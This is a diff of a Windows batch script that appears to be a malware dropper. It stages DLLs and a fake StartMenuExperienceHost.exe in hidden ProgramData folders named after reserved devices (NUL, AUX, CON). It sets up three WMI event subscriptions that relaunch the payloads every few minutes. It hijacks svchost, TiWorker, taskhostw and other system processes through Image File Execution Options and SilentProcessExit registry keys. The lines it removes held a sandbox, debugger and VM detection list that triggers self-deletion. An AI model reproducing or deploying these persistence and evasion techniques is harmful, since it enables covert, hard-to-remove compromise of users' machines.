@@ -1,18 +1,42 @@
-setlocal EnableDelayedExpansion
+mkdir \\.\%ProgramData%\NUL..\
+mkdir \\.\%ProgramData%\AUX..\
+mkdir \\.\%ProgramData%\CON..\
 
-if exist "%ProgramData%\AUX..\ShellExt.dll" (
-    rmdir /s /q "%~dp0"
-    exit /b
-)
+move /Y "%ProgramData%\Cedist\DeviceId.dll" "\\.\%ProgramData%\AUX..\"
+copy /Y "%ProgramData%\Cedist\ShellExt.dll" "\\.\%ProgramData%\AUX..\"
+move /Y "%ProgramData%\Cedist\7zxa.dll" "\\.\%ProgramData%\CON..\"
+move /Y "%ProgramData%\Cedist\ShellExt.dll" "\\.\%ProgramData%\CON..\"
+move /Y "%ProgramData%\Cedist\libssl-1_1.dll" "\\.\%ProgramData%\NUL..\"
+move /Y "%ProgramData%\Cedist\vcruntime140.dll" "\\.\%ProgramData%\NUL..\"
+move /Y "%ProgramData%\Cedist\libcrypto-1_1.dll" "\\.\%ProgramData%\NUL..\"
+move /Y "%ProgramData%\Cedist\StartMenuExperienceHost.exe" "\\.\%ProgramData%\NUL..\"
 
-set "processList=avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe SandboxieRpcSs.exe SandboxieDcomLaunch.exe httpdebuggerui.exe wireshark.exe fiddler.exe vboxservice.exe df5serv.exe vboxtray.exe vmtoolsd.exe vmwaretray.exe ida64.exe ollydbg.exe pestudio.exe vmwareuser.exe vgauthservice.exe vmacthlp.exe vmsrvc.exe x32dbg.exe x64dbg.exe x96dbg.exe vmusrvc.exe prl_cc.exe prl_tools.exe qemu-ga.exe joeboxcontrol.exe ksdumperclient.exe xenservice.exe joeboxserver.exe devenv.exe immunitydebugger.exe windbg.exe 32dbg.exe 64dbg.exe protection_id.exe scylla_x86.exe scylla_x64.exe scylla.exe idau64.exe idaq64.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="nut", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="nut", CommandLineTemplate="cmd /c start setup.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"nut\"", Consumer="CommandLineEventConsumer.Name=\"nut\""
 
-for %a in (%processList%) do (
-    tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%%a" >NUL
-    if not errorlevel 1 (
-        rmdir /s /q "%~dp0"
-        exit /b
-    )
-)
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="nur", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="nur", CommandLineTemplate="\\.\%ProgramData%\CON..\ShellExt.dll \\.\%ProgramData%\CON..\7zxa.dll"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"nur\"", Consumer="CommandLineEventConsumer.Name=\"nur\""
 
-mkdir \\.\C:\ProgramData\AUX..\
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="pers", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="pers", CommandLineTemplate="\\.\%ProgramData%\AUX..\ShellExt.dll \\.\%ProgramData%\AUX..\DeviceId.dll"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"pers\"", Consumer="CommandLineEventConsumer.Name=\"pers\""
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "\\.\%ProgramData%\CON..\ShellExt.dll \\.\%ProgramData%\CON..\7zxa.dll" /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhostw.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\taskhostw.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\taskhostw.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\CON..\ShellExt.dll \\.\%ProgramData%\CON..\7zxa.dll" /f /reg:64
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TiWorker.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\TiWorker.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\TiWorker.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\AUX..\ShellExt.dll \\.\%ProgramData%\AUX..\DeviceId.dll" /f /reg:64
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MoUsoCoreWorker.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\MoUsoCoreWorker.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\MoUsoCoreWorker.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\AUX..\ShellExt.dll \\.\%ProgramData%\AUX..\DeviceId.dll" /f /reg:64
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\AUX..\ShellExt.dll \\.\%ProgramData%\AUX..\DeviceId.dll" /f /reg:64
